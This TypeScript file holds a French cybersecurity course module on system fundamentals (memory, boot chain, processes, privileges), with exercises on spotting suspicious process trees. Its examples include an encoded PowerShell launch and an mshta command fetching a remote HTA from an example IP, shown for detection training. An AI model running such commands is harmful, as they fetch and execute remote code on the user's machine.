import type { CourseBody } from '../../types';
import { questions } from './questions';

export const body: CourseBody = {
  courseId: 'a-systemes-fondamentaux',
  lesson: {
    intro:
      "Avant de défendre un système, il faut savoir ce qu'il contient. Un attaquant cherche presque toujours la même chose : exécuter son code, avec le plus de privilèges possible, de façon persistante. Comprendre le matériel, le démarrage, les processus et le modèle de privilèges, c'est comprendre les cibles de l'attaquant et les barrières que le système lui oppose.",
    sections: [
      {
        id: 'materiel',
        title: 'Le matériel : processeur, mémoire, stockage',
        blocks: [
          { t: 'def', term: 'Processeur (CPU)', text: "Exécute les instructions machine, une à une, à partir de la mémoire. Il possède des **registres** (mémoire minuscule et ultra-rapide) et plusieurs **cœurs** capables de travailler en parallèle." },
          { t: 'def', term: 'Mémoire vive (RAM)', text: "Mémoire de travail **volatile** : elle contient les programmes en cours d'exécution et leurs données, et s'efface à l'extinction." },
          { t: 'def', term: 'Stockage', text: "Mémoire **persistante** (SSD, disque dur) qui conserve fichiers et système d'exploitation hors tension. Beaucoup plus lente que la RAM." },
          { t: 'def', term: 'Cache', text: "Petite mémoire très rapide, placée entre le processeur et la RAM, qui garde les données et instructions récemment utilisées. Elle est organisée en niveaux (L1, L2, L3) et reste volatile." },
          {
            t: 'table',
            caption: 'Hiérarchie mémoire (ordres de grandeur)',
            head: ['Niveau', 'Latence typique', 'Volatile ?', 'Intérêt pour la sécurité'],
            rows: [
              ['Registres CPU', '< 1 ns', 'Oui', 'Cibles des attaques par canaux auxiliaires'],
              ['Caches L1–L3', '1–40 ns', 'Oui', 'Spectre, Meltdown exploitent leurs effets de bord'],
              ['RAM', '≈ 100 ns', 'Oui', 'Contient clés, mots de passe en clair, malwares sans fichier'],
              ['SSD / disque', '≈ 0,1 ms / 10 ms', 'Non', 'Preuves persistantes, à chiffrer (BitLocker, LUKS)'],
            ],
          },
          { t: 'callout', kind: 'key', text: "La volatilité de la RAM a une conséquence forensique majeure : éteindre une machine compromise détruit les preuves en mémoire (processus malveillants, clés de chiffrement). L'acquisition mémoire se fait **avant** l'extinction." },
        ],
      },
      {
        id: 'donnees',
        title: 'Représenter l’information : bits, octets, hexadécimal',
        blocks: [
          { t: 'p', text: "Tout ce qu'un ordinateur manipule (texte, image, programme, clé de chiffrement) est représenté par des **bits**, qui valent 0 ou 1. Un **octet** regroupe 8 bits et peut prendre 256 valeurs, de 0 à 255. Un fichier n'est rien d'autre qu'une suite d'octets : c'est la façon de les interpréter qui en fait du texte, une image ou un programme." },
          { t: 'def', term: 'Hexadécimal', text: "Écriture en base 16, avec les chiffres 0 à 9 puis les lettres A à F. Un octet s'écrit toujours avec **deux** chiffres hexadécimaux (de `00` à `FF`) : c'est la notation des adresses mémoire, des empreintes et des vidages d'octets." },
          {
            t: 'table',
            caption: 'Un même octet, trois écritures',
            head: ['Décimal', 'Binaire', 'Hexadécimal'],
            rows: [['10', '00001010', '0A'], ['65', '01000001', '41'], ['255', '11111111', 'FF']],
          },
          { t: 'def', term: 'Encodage de caractères', text: "Règle qui associe un caractère à une valeur numérique. L'**ASCII** couvre 128 caractères (`A` = 65, `a` = 97). **UTF-8** représente tout Unicode avec 1 à 4 octets par caractère et reste identique à l'ASCII pour les 128 premiers." },
          {
            t: 'example',
            title: 'Lire les premiers octets d’un fichier',
            blocks: [
              { t: 'code', lang: 'text', code: '4D 5A 90 00 03 00 00 00 ...   →  « MZ » : exécutable Windows (format PE)\n25 50 44 46 2D ...            →  « %PDF- » : document PDF\nFF D8 FF E0 ...               →  image JPEG' },
              { t: 'p', text: "Ces premiers octets, la **signature** du fichier, indiquent son vrai type. Un fichier nommé `facture.pdf` qui commence par `4D 5A` est un exécutable déguisé : en investigation, on lit le contenu plutôt que de se fier au nom." },
            ],
          },
          { t: 'callout', kind: 'key', text: "Savoir passer du binaire à l'hexadécimal et lire un vidage d'octets est une compétence de base de l'analyse de fichiers, de la forensique et de l'étude des malwares." },
        ],
      },
      {
        id: 'demarrage',
        title: 'Le démarrage : du firmware au système',
        blocks: [
          { t: 'list', ordered: true, items: ["Mise sous tension : le **firmware** (UEFI, anciennement BIOS) s'exécute depuis une puce de la carte mère.", 'Le firmware initialise le matériel et cherche un **chargeur d’amorçage** (bootloader).', 'Le chargeur (Windows Boot Manager, GRUB) charge le **noyau** du système d’exploitation.', 'Le noyau initialise les pilotes puis lance le premier processus (`systemd` sous Linux, `smss.exe` puis `wininit.exe` sous Windows).'] },
          { t: 'def', term: 'Secure Boot', text: "Fonction UEFI qui n'autorise l'exécution que de chargeurs et de noyaux **signés** par une clé de confiance. Elle bloque les bootkits qui s'insèrent avant le système." },
          { t: 'def', term: 'TPM (Trusted Platform Module)', text: "Composant (puce dédiée ou fonction du firmware) qui protège des clés et enregistre des **mesures** de la chaîne de démarrage. Il permet, par exemple, à BitLocker de ne libérer la clé du disque que si le démarrage n'a pas été modifié." },
          { t: 'callout', kind: 'warn', text: "Un code malveillant qui s'exécute avant le système d'exploitation (bootkit, implant UEFI) échappe à l'antivirus, qui démarre après lui. C'est pourquoi Secure Boot, le mot de passe firmware et les mises à jour UEFI comptent." },
        ],
      },
      {
        id: 'processus',
        title: 'Noyau, processus, threads et services',
        blocks: [
          { t: 'p', text: "Le **noyau** (kernel) a un accès total au matériel ; il s'exécute en **mode privilégié** (anneau 0). Les applications s'exécutent en **espace utilisateur** (anneau 3) et doivent passer par des **appels système** pour lire un fichier ou ouvrir une connexion." },
          { t: 'def', term: 'Processus', text: "Programme en cours d'exécution, avec son propre **espace d'adressage mémoire**, un identifiant (PID), un processus parent et un **contexte de sécurité** (l'utilisateur pour lequel il agit)." },
          { t: 'def', term: 'Thread', text: 'Fil d’exécution au sein d’un processus ; les threads d’un même processus partagent sa mémoire.' },
          { t: 'def', term: 'Service / démon', text: "Processus lancé en arrière-plan, souvent au démarrage, sans interface : serveur web, SSH, planificateur de tâches. Souvent exécuté avec des privilèges élevés : une cible de choix." },
          {
            t: 'example',
            title: 'Une arborescence de processus suspecte',
            blocks: [
              { t: 'code', lang: 'text', code: 'explorer.exe (PID 2412)\n └─ WINWORD.EXE (PID 5120)\n     └─ cmd.exe (PID 6604)\n         └─ powershell.exe -enc JABjAGwAaQBlAG4AdAA... (PID 6688)' },
              { t: 'p', text: "Un traitement de texte n'a aucune raison légitime de lancer un interpréteur de commandes, qui lance à son tour PowerShell avec une commande encodée. C'est la signature classique d'un **document piégé** (macro malveillante). Les EDR surveillent précisément ces relations parent-enfant anormales." },
            ],
          },
        ],
      },
      {
        id: 'espace-adressage',
        title: 'La mémoire d’un processus et son isolation',
        blocks: [
          { t: 'p', text: "Chaque processus croit disposer de toute la mémoire pour lui seul : il voit un espace d'adressage **virtuel** privé. Le processeur (son unité de gestion mémoire, la **MMU**) et le noyau traduisent ces adresses virtuelles en adresses de la mémoire physique, et contrôlent les droits de chaque page : lecture, écriture, exécution." },
          { t: 'def', term: 'Mémoire virtuelle', text: "Abstraction qui donne à chaque processus son propre espace d'adressage. Un processus ordinaire ne peut pas lire ni modifier la mémoire d'un autre : c'est la première barrière d'isolation du système." },
          {
            t: 'table',
            caption: 'Zones principales de la mémoire d’un processus',
            head: ['Zone', 'Contenu', 'Intérêt pour la sécurité'],
            rows: [
              ['Code', 'Instructions du programme', 'Lecture et exécution, pas d’écriture'],
              ['Pile (stack)', 'Appels de fonctions, variables locales, adresses de retour', 'Cible des débordements de tampon'],
              ['Tas (heap)', 'Données allouées dynamiquement', 'Cible des erreurs de gestion mémoire (use-after-free)'],
            ],
          },
          { t: 'def', term: 'NX / DEP', text: "Protection qui marque la pile et le tas comme **non exécutables** : du code injecté dans ces zones ne peut plus s'exécuter directement." },
          { t: 'def', term: 'ASLR', text: "Technique qui **rend aléatoires** les adresses du code, de la pile et du tas à chaque lancement, pour qu'un attaquant ne puisse pas les prédire." },
          { t: 'callout', kind: 'warn', text: "L'isolation des processus est une barrière, pas une garantie : une vulnérabilité mémoire dans une application ou dans le noyau peut permettre de la franchir. Ces failles sont étudiées dans le module G." },
        ],
      },
      {
        id: 'privileges',
        title: 'Privilèges et moindre privilège',
        blocks: [
          { t: 'p', text: "Chaque processus agit au nom d'un compte. Ce que le processus peut faire est limité par les **droits** de ce compte : un navigateur lancé par un utilisateur standard ne peut pas modifier les fichiers système." },
          {
            t: 'table',
            head: ['Système', 'Compte tout-puissant', 'Mécanisme d’élévation'],
            rows: [['Linux', '`root` (UID 0)', '`sudo`, binaires SUID'], ['Windows', '`SYSTEM`, Administrateurs', 'UAC (contrôle de compte d’utilisateur), services']],
          },
          { t: 'def', term: 'Principe du moindre privilège', text: "Chaque utilisateur, processus ou service ne doit disposer que des droits **strictement nécessaires** à sa fonction, et seulement pour la durée nécessaire." },
          { t: 'def', term: 'Bit SUID', text: "Permission Linux qui fait exécuter un programme avec l'identité de son **propriétaire** (souvent `root`) et non celle de l'utilisateur qui le lance. Indispensable pour certains outils, mais un programme SUID vulnérable est un vecteur classique d'élévation de privilèges." },
          { t: 'def', term: 'Compte de service', text: "Compte dédié à un service ou à une application : droits limités à sa tâche, pas d'ouverture de session interactive, mot de passe long et géré. Il évite de faire tourner un service avec un compte administrateur." },
          { t: 'def', term: 'Élévation de privilèges', text: "Technique par laquelle un attaquant passe d'un contexte limité (utilisateur) à un contexte plus puissant (administrateur, SYSTEM, root) en exploitant une faille ou une mauvaise configuration." },
          { t: 'callout', kind: 'key', text: "Une compromission sous un compte standard reste souvent **contenue**. La même compromission sous un compte administrateur donne l'ensemble de la machine. Travailler au quotidien sans droits d'administration est l'une des mesures les plus rentables." },
        ],
      },
    ],
    useCases: [
      "Investigation : analyser l'arbre des processus pour repérer un enchaînement anormal (Word → cmd → PowerShell).",
      'Durcissement de postes : retirer les droits d’administration locaux des utilisateurs et activer Secure Boot.',
      "Réponse à incident : décider d'acquérir la mémoire vive avant d'éteindre une machine suspecte.",
    ],
    commonMistakes: [
      'Éteindre immédiatement une machine compromise, détruisant les preuves en mémoire vive.',
      'Utiliser un compte administrateur pour la navigation et la messagerie au quotidien.',
      'Désactiver Secure Boot « pour que ça marche » sans évaluer le risque.',
      'Confondre processus et programme : un même exécutable peut tourner dans plusieurs processus aux droits différents.',
    ],
    bestPractices: [
      'Appliquer le moindre privilège aux utilisateurs comme aux comptes de service.',
      'Activer Secure Boot, protéger le firmware par mot de passe et le maintenir à jour.',
      'Surveiller les relations parent-enfant anormales entre processus (EDR, Sysmon).',
      'Chiffrer le stockage pour protéger les données en cas de vol du matériel.',
    ],
    keyPoints: [
      'La RAM est volatile : les preuves en mémoire disparaissent à l’extinction.',
      'UEFI et Secure Boot protègent la chaîne de démarrage avant le système d’exploitation.',
      'Le noyau est privilégié ; les applications passent par des appels système.',
      'Chaque processus a un contexte de sécurité ; le moindre privilège limite l’impact d’une compromission.',
    ],
  },
  practice: [
    {
      id: 'arbre-processus',
      kind: 'analysis',
      title: 'Analyse d’un arbre de processus',
      context: [
        { t: 'p', text: 'Voici trois arborescences relevées sur des postes de travail. Laquelle mérite une investigation, et pourquoi ?' },
        { t: 'code', lang: 'text', code: 'A) services.exe → svchost.exe -k netsvcs\nB) explorer.exe → chrome.exe → chrome.exe --type=renderer\nC) outlook.exe → excel.exe → mshta.exe http://203.0.113.50/a.hta' },
      ],
      steps: ['Pour chaque cas, identifier le parent et l’enfant.', 'Se demander si la relation est attendue dans un usage normal.', 'Qualifier le niveau de suspicion et proposer une première action.'],
    },
    {
      id: 'moindre-privilege',
      kind: 'case',
      title: 'Cas pratique : appliquer le moindre privilège',
      context: [{ t: 'p', text: 'Dans une agence de 20 personnes, tous les salariés sont administrateurs locaux de leur poste « pour pouvoir installer des logiciels ». Le service de sauvegarde tourne sous un compte administrateur du domaine.' }],
      steps: ['Identifier les risques de cette configuration.', 'Proposer une organisation alternative pour l’installation de logiciels.', 'Proposer une configuration pour le compte du service de sauvegarde.'],
    },
  ],
  questions,
  resources: [
    { title: 'Recommandations de configuration d’un système GNU/Linux', source: 'ANSSI (guide)' },
    { title: 'NIST SP 800-147 — BIOS Protection Guidelines', source: 'NIST', url: 'https://csrc.nist.gov/pubs/sp/800/147/final' },
    { title: 'UEFI Specification — Secure Boot', source: 'UEFI Forum', url: 'https://uefi.org/specifications' },
  ],
};
